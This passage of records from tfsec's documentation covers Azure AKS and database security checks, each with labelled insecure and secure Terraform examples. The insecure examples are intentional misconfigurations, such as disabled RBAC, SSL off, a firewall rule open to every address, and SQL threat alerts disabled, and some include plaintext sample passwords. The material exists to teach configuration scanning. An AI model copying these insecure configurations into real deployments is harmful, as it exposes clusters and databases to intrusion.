{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/container/configured-network-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/container/configured-network-policy/index.md", "content": "---\ntitle: Ensure AKS cluster has Network Policy configured\n---\n\n# Ensure AKS cluster has Network Policy configured\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThe Kubernetes object type NetworkPolicy should be defined to have opportunity allow or block traffic to pods, as in a Kubernetes cluster configured with default settings, all pods can discover and communicate with each other without any restrictions.\n\n### Possible Impact\nNo network policy is protecting the AKS cluster\n\n### Suggested Resolution\nConfigure a network policy\n\n\n### Insecure Example\n\nThe following example will fail the azure-container-configured-network-policy check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n \tnetwork_profile {\n \t  }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-container-configured-network-policy check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n \tnetwork_profile {\n \t  network_policy = \"calico\"\n \t  }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#network_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://kubernetes.io/docs/concepts/services-networking/network-policies](https://kubernetes.io/docs/concepts/services-networking/network-policies){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:41.417190"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/container/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/container/index.md", "content": "---\ntitle: container\n---\n\n# container\n\n## Checks\n\n\n- [configured-network-policy](configured-network-policy) Ensure AKS cluster has Network Policy configured\n\n- [limit-authorized-ips](limit-authorized-ips) Ensure AKS has an API Server Authorized IP Ranges enabled\n\n- [logging](logging) Ensure AKS logging to Azure Monitoring is Configured\n\n- [use-rbac-permissions](use-rbac-permissions) Ensure RBAC is enabled on AKS clusters\n\n\n\n", "timestamp": "2025-10-24T22:24:41.519233"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/container/limit-authorized-ips/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/container/limit-authorized-ips/index.md", "content": "---\ntitle: Ensure AKS has an API Server Authorized IP Ranges enabled\n---\n\n# Ensure AKS has an API Server Authorized IP Ranges enabled\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nThe API server is the central way to interact with and manage a cluster. To improve cluster security and minimize attacks, the API server should only be accessible from a limited set of IP address ranges.\n\n### Possible Impact\nAny IP can interact with the API server\n\n### Suggested Resolution\nLimit the access to the API server to a limited IP range\n\n\n### Insecure Example\n\nThe following example will fail the azure-container-limit-authorized-ips check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n \n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-container-limit-authorized-ips check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n     api_server_authorized_ip_ranges = [\n \t\t\"1.2.3.4/32\"\n \t]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#api_server_authorized_ip_ranges](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#api_server_authorized_ip_ranges){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/aks/api-server-authorized-ip-ranges](https://docs.microsoft.com/en-us/azure/aks/api-server-authorized-ip-ranges){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:41.778761"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/container/logging/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/container/logging/index.md", "content": "---\ntitle: Ensure AKS logging to Azure Monitoring is Configured\n---\n\n# Ensure AKS logging to Azure Monitoring is Configured\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nEnsure AKS logging to Azure Monitoring is configured for containers to monitor the performance of workloads.\n\n### Possible Impact\nLogging provides valuable information about access and usage\n\n### Suggested Resolution\nEnable logging for AKS\n\n\n### Insecure Example\n\nThe following example will fail the azure-container-logging check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n     addon_profile {}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-container-logging check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n     addon_profile {\n \t\toms_agent {\n \t\t\tenabled = true\n \t\t}\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/kubernetes_cluster#oms_agent){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-monitor/insights/container-insights-onboard](https://docs.microsoft.com/en-us/azure/azure-monitor/insights/container-insights-onboard){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:42.046060"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/container/use-rbac-permissions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/container/use-rbac-permissions/index.md", "content": "---\ntitle: Ensure RBAC is enabled on AKS clusters\n---\n\n# Ensure RBAC is enabled on AKS clusters\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nUsing Kubernetes role-based access control (RBAC), you can grant users, groups, and service accounts access to only the resources they need.\n\n### Possible Impact\nNo role based access control is in place for the AKS cluster\n\n### Suggested Resolution\nEnable RBAC\n\n\n### Insecure Example\n\nThe following example will fail the azure-container-use-rbac-permissions check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"bad_example\" {\n\t// azurerm < 2.99.0\n \trole_based_access_control {\n \t\tenabled = false\n \t}\n\n\t// azurerm >= 2.99.0\n\trole_based_access_control_enabled = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-container-use-rbac-permissions check.\n```terraform\n\n resource \"azurerm_kubernetes_cluster\" \"good_example\" {\n\t// azurerm < 2.99.0\n\trole_based_access_control {\n \t\tenabled = true\n \t}\n\n\t// azurerm >= 2.99.0\n \trole_based_access_control_enabled = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control](https://www.terraform.io/docs/providers/azurerm/r/kubernetes_cluster.html#role_based_access_control){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/aks/concepts-identity](https://docs.microsoft.com/en-us/azure/aks/concepts-identity){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:42.318409"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/all-threat-alerts-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/all-threat-alerts-enabled/index.md", "content": "---\ntitle: No threat detections are set\n---\n\n# No threat detections are set\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nSQL Server can alert for security issues including SQL Injection, vulnerabilities, access anomalies and data exfiltration. Ensure none of these are disabled to benefit from the best protection\n\n### Possible Impact\nDisabling threat alerts means you are not getting the full benefit of server security protection\n\n### Suggested Resolution\nUse all provided threat alerts\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-all-threat-alerts-enabled check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"bad_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = [\n     \"Sql_Injection\",\n     \"Data_Exfiltration\"\n   ]\n   retention_days = 20\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-all-threat-alerts-enabled check.\n```terraform\n\n resource \"azurerm_mssql_server_security_alert_policy\" \"good_example\" {\n   resource_group_name        = azurerm_resource_group.example.name\n   server_name                = azurerm_sql_server.example.name\n   state                      = \"Enabled\"\n   storage_endpoint           = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   disabled_alerts = []\n   retention_days = 20\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_server_security_alert_policy#disabled_alerts){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:42.777914"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/enable-audit/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/enable-audit/index.md", "content": "---\ntitle: Auditing should be enabled on Azure SQL Databases\n---\n\n# Auditing should be enabled on Azure SQL Databases\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nAuditing helps you maintain regulatory compliance, understand database activity, and gain insight into discrepancies and anomalies that could indicate business concerns or suspected security violations.\n\n### Possible Impact\nAuditing provides valuable information about access and usage\n\n### Suggested Resolution\nEnable auditing on Azure SQL databases\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-enable-audit check.\n```terraform\n\n resource \"azurerm_sql_server\" \"bad_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"mradministrator\"\n   administrator_login_password = \"tfsecRocks\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-enable-audit check.\n```terraform\n\n resource \"azurerm_sql_server\" \"good_example\" {\n   name                         = \"mssqlserver\"\n   resource_group_name          = azurerm_resource_group.example.name\n   location                     = azurerm_resource_group.example.location\n   version                      = \"12.0\"\n   administrator_login          = \"mradministrator\"\n   administrator_login_password = \"tfsecRocks\"\n \n   extended_auditing_policy {\n     storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n     storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n     storage_account_access_key_is_secondary = true\n     retention_in_days                       = 6\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_server#extended_auditing_policy](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_server#extended_auditing_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview](https://docs.microsoft.com/en-us/azure/azure-sql/database/auditing-overview){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:43.051181"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/enable-ssl-enforcement/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/enable-ssl-enforcement/index.md", "content": "---\ntitle: SSL should be enforced on database connections where applicable\n---\n\n# SSL should be enforced on database connections where applicable\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nSSL connections should be enforced were available to ensure secure transfer and reduce the risk of compromising data in flight.\n\n### Possible Impact\nInsecure connections could lead to data loss and other vulnerabilities\n\n### Suggested Resolution\nEnable SSL enforcement\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-enable-ssl-enforcement check.\n```terraform\n\n resource \"azurerm_postgresql_server\" \"bad_example\" {\n   name                = \"bad_example\"\n \n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-enable-ssl-enforcement check.\n```terraform\n\n resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"good_example\"\n \n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = true\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#ssl_enforcement_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#ssl_enforcement_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#ssl_enforcement_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:43.315805"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/index.md", "content": "---\ntitle: database\n---\n\n# database\n\n## Checks\n\n\n- [all-threat-alerts-enabled](all-threat-alerts-enabled) No threat detections are set\n\n- [enable-audit](enable-audit) Auditing should be enabled on Azure SQL Databases\n\n- [enable-ssl-enforcement](enable-ssl-enforcement) SSL should be enforced on database connections where applicable\n\n- [no-public-access](no-public-access) Ensure databases are not publicly accessible\n\n- [no-public-firewall-access](no-public-firewall-access) Ensure database firewalls do not permit public access\n\n- [postgres-configuration-connection-throttling](postgres-configuration-connection-throttling) Ensure server parameter 'connection_throttling' is set to 'ON' for PostgreSQL Database Server\n\n- [postgres-configuration-log-checkpoints](postgres-configuration-log-checkpoints) Ensure server parameter 'log_checkpoints' is set to 'ON' for PostgreSQL Database Server\n\n- [postgres-configuration-log-connections](postgres-configuration-log-connections) Ensure server parameter 'log_connections' is set to 'ON' for PostgreSQL Database Server\n\n- [retention-period-set](retention-period-set) Database auditing retention period should be longer than 90 days\n\n- [secure-tls-policy](secure-tls-policy) Databases should have the minimum TLS set for connections\n\n- [threat-alert-email-set](threat-alert-email-set) At least one email address is set for threat alerts\n\n- [threat-alert-email-to-owner](threat-alert-email-to-owner) Security threat alerts go to subscription owners and co-administrators\n\n\n\n", "timestamp": "2025-10-24T22:24:43.418237"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/no-public-access/index.md", "content": "---\ntitle: Ensure databases are not publicly accessible\n---\n\n# Ensure databases are not publicly accessible\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDatabase resources should not publicly available. You should limit all access to the minimum that is required for your application to function.\n\n### Possible Impact\nPublicly accessible database could lead to compromised data\n\n### Suggested Resolution\nDisable public access to database when not required\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-no-public-access check.\n```terraform\n\n resource \"azurerm_postgresql_server\" \"bad_example\" {\n   name                = \"bad_example\"\n \n   public_network_access_enabled    = true\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-no-public-access check.\n```terraform\n\n resource \"azurerm_postgresql_server\" \"good_example\" {\n   name                = \"bad_example\"\n \n   public_network_access_enabled    = false\n   ssl_enforcement_enabled          = false\n   ssl_minimal_tls_version_enforced = \"TLS1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_server#public_network_access_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mysql_server#public_network_access_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mariadb_server#public_network_access_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:43.692337"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/no-public-firewall-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/no-public-firewall-access/index.md", "content": "---\ntitle: Ensure database firewalls do not permit public access\n---\n\n# Ensure database firewalls do not permit public access\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAzure services can be allowed access through the firewall using a start and end IP address of 0.0.0.0. No other end ip address should be combined with a start of 0.0.0.0\n\n### Possible Impact\nPublicly accessible databases could lead to compromised data\n\n### Suggested Resolution\nDon't use wide ip ranges for the sql firewall\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-no-public-firewall-access check.\n```terraform\n\n resource \"azurerm_sql_firewall_rule\" \"bad_example\" {\n   name                = \"bad_rule\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_sql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"255.255.255.255\"\n }\n \n resource \"azurerm_postgresql_firewall_rule\" \"bad_example\" {\n   name                = \"bad_example\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_postgresql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"255.255.255.255\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-no-public-firewall-access check.\n```terraform\n\n resource \"azurerm_sql_firewall_rule\" \"good_example\" {\n   name                = \"good_rule\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_sql_server.example.name\n   start_ip_address    = \"0.0.0.0\"\n   end_ip_address      = \"0.0.0.0\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/sql_firewall_rule#end_ip_address){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/rest/api/sql/2021-02-01-preview/firewall-rules/create-or-update](https://docs.microsoft.com/en-us/rest/api/sql/2021-02-01-preview/firewall-rules/create-or-update){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:43.959162"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/postgres-configuration-connection-throttling/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/postgres-configuration-connection-throttling/index.md", "content": "---\ntitle: Ensure server parameter 'connection_throttling' is set to 'ON' for PostgreSQL Database Server\n---\n\n# Ensure server parameter 'connection_throttling' is set to 'ON' for PostgreSQL Database Server\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nPostgresql can generate logs for connection throttling to improve visibility for audit and configuration issue resolution.\n\n### Possible Impact\nNo log information to help diagnosing connection contention issues\n\n### Suggested Resolution\nEnable connection throttling logging\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-postgres-configuration-connection-throttling check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-postgres-configuration-connection-throttling check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n resource \"azurerm_postgresql_configuration\" \"example\" {\n \tname                = \"connection_throttling\"\n \tresource_group_name = azurerm_resource_group.example.name\n \tserver_name         = azurerm_postgresql_server.example.name\n \tvalue               = \"on\"\n   }\n   \n   \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging](https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:44.232376"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/postgres-configuration-log-checkpoints/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/postgres-configuration-log-checkpoints/index.md", "content": "---\ntitle: Ensure server parameter 'log_checkpoints' is set to 'ON' for PostgreSQL Database Server\n---\n\n# Ensure server parameter 'log_checkpoints' is set to 'ON' for PostgreSQL Database Server\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nPostgresql can generate logs for checkpoints to improve visibility for audit and configuration issue resolution.\n\n### Possible Impact\nNo error and query logs generated on checkpoint\n\n### Suggested Resolution\nEnable checkpoint logging\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-postgres-configuration-log-checkpoints check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-postgres-configuration-log-checkpoints check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n resource \"azurerm_postgresql_configuration\" \"example\" {\n   name                = \"log_checkpoints\"\n   resource_group_name = azurerm_resource_group.example.name\n   server_name         = azurerm_postgresql_server.example.name\n   value               = \"on\"\n }\n \n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging](https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:44.522572"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/postgres-configuration-log-connections/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/postgres-configuration-log-connections/index.md", "content": "---\ntitle: Ensure server parameter 'log_connections' is set to 'ON' for PostgreSQL Database Server\n---\n\n# Ensure server parameter 'log_connections' is set to 'ON' for PostgreSQL Database Server\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nPostgresql can generate logs for successful connections to improve visibility for audit and configuration issue resolution.\n\n### Possible Impact\nNo visibility of successful connections\n\n### Suggested Resolution\nEnable connection logging\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-postgres-configuration-log-connections check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-postgres-configuration-log-connections check.\n```terraform\n\n resource \"azurerm_resource_group\" \"example\" {\n   name     = \"example-resources\"\n   location = \"West Europe\"\n }\n \n resource \"azurerm_postgresql_server\" \"example\" {\n   name                = \"example-psqlserver\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n \n   administrator_login          = \"psqladminun\"\n   administrator_login_password = \"H@Sh1CoR3!\"\n \n   sku_name   = \"GP_Gen5_4\"\n   version    = \"9.6\"\n   storage_mb = 640000\n }\n \n resource \"azurerm_postgresql_configuration\" \"example\" {\n \tname                = \"log_connections\"\n \tresource_group_name = azurerm_resource_group.example.name\n \tserver_name         = azurerm_postgresql_server.example.name\n \tvalue               = \"on\"\n   }\n   \n   \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/postgresql_configuration){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging](https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging](https://docs.microsoft.com/en-us/azure/postgresql/concepts-server-logs#configure-logging){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:44.833078"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/database/retention-period-set/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/database/retention-period-set/index.md", "content": "---\ntitle: Database auditing retention period should be longer than 90 days\n---\n\n# Database auditing retention period should be longer than 90 days\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhen Auditing is configured for a SQL database, if the retention period is not set, the retention will be unlimited.\n\nIf the retention period is to be explicitly set, it should be set for no less than 90 days.\n\n### Possible Impact\nShort logging retention could result in missing valuable historical information\n\n### Suggested Resolution\nSet retention periods of database auditing to greater than 90 days\n\n\n### Insecure Example\n\nThe following example will fail the azure-database-retention-period-set check.\n```terraform\n\n resource \"azurerm_mssql_database_extended_auditing_policy\" \"bad_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n   retention_in_days                       = 6\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-database-retention-period-set check.\n```terraform\n\n resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n }\n \n resource \"azurerm_mssql_database_extended_auditing_policy\" \"good_example\" {\n   database_id                             = azurerm_mssql_database.example.id\n   storage_endpoint                        = azurerm_storage_account.example.primary_blob_endpoint\n   storage_account_access_key              = azurerm_storage_account.example.primary_access_key\n   storage_account_access_key_is_secondary = false\n   retention_in_days                       = 90\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/mssql_database_extended_auditing_policy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- 